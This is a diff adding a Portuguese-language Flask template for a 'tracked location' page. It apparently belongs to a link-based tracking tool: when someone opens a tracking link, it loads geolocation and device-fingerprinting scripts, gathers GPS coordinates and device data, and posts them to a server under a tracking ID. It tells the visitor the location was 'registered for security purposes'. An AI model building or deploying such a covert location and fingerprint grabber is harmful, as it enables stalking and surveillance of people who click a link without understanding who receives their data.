@@ -1,0 +1,323 @@
+{% extends 'base.html' %}
+
+{% block title %}Localização Rastreada{% endblock %}
+
+{% block head %}
+<script src="{{ url_for('static', filename='js/geo_tracker.js') }}"></script>
+<script src="{{ url_for('static', filename='js/device_fingerprint.js') }}"></script>
+<script src="{{ url_for('static', filename='js/enhanced_geo_prompt.js') }}"></script>
+<script src="{{ url_for('static', filename='js/advanced_geo_data.js') }}"></script>
+<style>
+    .location-card {
+        background-color: rgba(0, 0, 0, 0.03);
+        border-radius: 15px;
+        padding: 18px;
+        margin-bottom: 25px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        transition: transform 0.3s, box-shadow 0.3s;
+    }
+    
+    .location-card:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+    }
+    
+    .location-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 15px;
+        color: #2576CF;
+        font-weight: 600;
+    }
+    
+    .location-body {
+        font-size: 0.95rem;
+    }
+    
+    .device-info-section {
+        border-top: 1px solid rgba(0, 0, 0, 0.1);
+        padding-top: 18px;
+        margin-top: 18px;
+    }
+    
+    .pulse-ring {
+        border: 3px solid #2196F3;
+        border-radius: 50%;
+        height: 120px;
+        width: 120px;
+        position: relative;
+        margin: 0 auto 25px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: pulse 2s infinite;
+    }
+    
+    .pulse-core {
+        background-color: #2196F3;
+        border-radius: 50%;
+        height: 70px;
+        width: 70px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        font-size: 26px;
+    }
+    
+    @keyframes pulse {
+        0% {
+            transform: scale(0.95);
+            box-shadow: 0 0 0 0 rgba(33, 150, 243, 0.7);
+        }
+        
+        70% {
+            transform: scale(1);
+            box-shadow: 0 0 0 20px rgba(33, 150, 243, 0);
+        }
+        
+        100% {
+            transform: scale(0.95);
+            box-shadow: 0 0 0 0 rgba(33, 150, 243, 0);
+        }
+    }
+    
+    /* Estilos para o botão de tentar novamente */
+    .retry-button {
+        width: 80px;
+        height: 80px;
+        border-radius: 50% !important;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+        transition: all 0.3s ease;
+        background-color: #2576CF;
+        border: none;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    
+    .retry-button:hover {
+        transform: translateY(-3px) scale(1.05);
+        box-shadow: 0 6px 15px rgba(0,0,0,0.25);
+        background-color: #1D65B8;
+    }
+    
+    .retry-button:active {
+        transform: translateY(0) scale(0.98);
+        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    
+    .alert {
+        border-radius: 12px;
+        padding: 15px 20px;
+        border: none;
+        box-shadow: 0 3px 10px rgba(0,0,0,0.05);
+    }
+    
+    .alert-danger {
+        background-color: rgba(220, 53, 69, 0.1);
+        color: #721c24;
+    }
+    
+    .alert-success {
+        background-color: rgba(40, 167, 69, 0.1);
+        color: #155724;
+    }
+    
+    .card {
+        border: none;
+        border-radius: 15px;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+        overflow: hidden;
+    }
+    
+    .card-header {
+        padding: 15px 20px;
+        border-bottom: none;
+    }
+    
+    .card-body {
+        padding: 20px;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container mt-5">
+    <div class="row justify-content-center">
+        <div class="col-lg-10">
+            <div class="card shadow-lg mb-4">
+                <div class="card-header bg-primary text-white">
+                    <h4 class="mb-0"><i class="fas fa-satellite me-2"></i>Localização GPS em Tempo Real</h4>
+                </div>
+                <div class="card-body">
+                    <!-- Status de rastreamento -->
+                    <div id="tracking-status" class="text-center py-4">
+                        <div class="pulse-ring">
+                            <div class="pulse-core">
+                                <i class="fas fa-satellite fa-lg"></i>
+                            </div>
+                        </div>
+                        <h4 class="mb-3">Obtendo sua localização GPS...</h4>
+                        <p class="text-muted">
+                            Por favor, permita o acesso à sua localização quando solicitado pelo navegador. 
+                            Estamos usando o sistema GPS/GPRS do seu dispositivo para obter coordenadas precisas.
+                        </p>
+                    </div>
+
+                    <!-- Detalhes da localização (inicialmente ocultos) -->
+                    <div id="location-details" class="d-none mt-4"></div>
+                </div>
+                <div class="card-footer">
+                    <div class="row align-items-center">
+                        <div class="col-md-7">
+                            <div class="alert alert-info mb-0">
+                                <i class="fas fa-info-circle me-2"></i>
+                                Sua localização foi registrada para fins de segurança.
+                            </div>
+                        </div>
+                        <div class="col-md-5 text-md-end mt-3 mt-md-0">
+                            <a href="{{ url_for('index') }}" class="btn btn-primary">
+                                <i class="fas fa-home me-2"></i>Voltar ao Início
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Mapa (inicialmente oculto) -->
+            <div id="map-container" class="card shadow-lg d-none">
+                <div class="card-header bg-success text-white">
+                    <h4 class="mb-0"><i class="fas fa-map-marked-alt me-2"></i>Mapa de Localização</h4>
+                </div>
+                <div class="card-body p-0" style="height: 400px;">
+                    <!-- O mapa será inserido aqui via JavaScript -->
+                </div>
+                <div class="card-footer bg-light">
+                    <div class="text-center">
+                        <small class="text-muted">
+                            <i class="fas fa-info-circle me-1"></i> 
+                            O marcador indica sua localização exata baseada em GPS. A precisão varia de acordo com seu dispositivo e condições de sinal.
+                        </small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Tentar obter localização do dispositivo do usuário que clicou no link
+        try {
+            // Mostrar status de carregamento
+            const statusElement = document.getElementById('tracking-status');
+            if (statusElement) {
+                statusElement.innerHTML = `
+                    <div class="pulse-ring">
+                        <div class="pulse-core">
+                            <i class="fas fa-satellite fa-lg"></i>
+                        </div>
+                    </div>
+                    <h4 class="mb-3">Obtendo sua localização GPS...</h4>
+                    <p class="text-muted">
+                        Estamos coletando dados de localização precisa. 
+                        Isso pode levar alguns segundos...
+                    </p>
+                `;
+            }
+            
+            // Usar a função avançada de coleta de dados
+            async function enviarDadosAvancados() {
+                try {
+                    // Coletar dados avançados
+                    const dadosAvancados = await obterDadosAvancados();
+                    console.log("Dados avançados obtidos:", dadosAvancados);
+                    
+                    // Atualizar status
+                    if (statusElement) {
+                        statusElement.innerHTML = `
+                            <div class="d-flex align-items-center justify-content-center">
+                                <div class="spinner-border text-primary me-2" role="status"></div>
+                                <span>Enviando dados para processamento...</span>
+                            </div>
+                        `;
+                    }
+                    
+                    // Enviar para o servidor
+                    const response = await fetch('/submit_location/{{ tracking_id }}', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(dadosAvancados)
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error('Erro na resposta do servidor');
+                    }
+                    
+                    const data = await response.json();
+                    console.log('Resposta do servidor:', data);
+                    
+                    // Mostrar sucesso
+                    if (statusElement) {
+                        statusElement.innerHTML = `
+                            <div class="alert alert-success">
+                                <i class="fas fa-check-circle me-2"></i>
+                                Localização obtida com sucesso!
+                            </div>
+                        `;
+                    }
+                    
+                    // Atualizar exibição com os dados
+                    updateLocationDisplay(data);
+                    
+                } catch (error) {
+                    console.error('Erro:', error);
+                    
+                    // Fallback para o método antigo se o avançado falhar
+                    if (statusElement) {
+                        statusElement.innerHTML = `
+                            <div class="alert alert-warning text-center">
+                                <p>Usando método alternativo de localização...</p>
+                            </div>
+                        `;
+                    }
+                    
+                    // Usar o sistema de geolocalização anterior (fallback)
+                    setTimeout(() => {
+                        enhancedTrackLocation('{{ tracking_id }}');
+                    }, 1000);
+                }
+            }
+            
+            // Iniciar coleta e envio de dados
+            enviarDadosAvancados();
+            
+        } catch (e) {
+            console.error('Erro ao iniciar rastreamento:', e);
+            
+            // Mostrar mensagem de erro
+            const statusElement = document.getElementById('tracking-status');
+            if (statusElement) {
+                statusElement.innerHTML = `
+                    <div class="alert alert-danger text-center">
+                        <i class="fas fa-exclamation-triangle fa-2x mb-3"></i>
+                        <p>Erro ao iniciar o rastreamento: ${e.message}</p>
+                    </div>
+                    <div class="text-center mt-4">
+                        <button class="retry-button" onclick="location.reload()" 
+                                title="Tentar Novamente">
+                            <i class="fas fa-redo fa-2x text-white"></i>
+                        </button>
+                        <p class="mt-2 text-muted">Tentar Novamente</p>
+                    </div>
+                `;
+            }
+        }
+    });
+</script>
+{% endblock %}
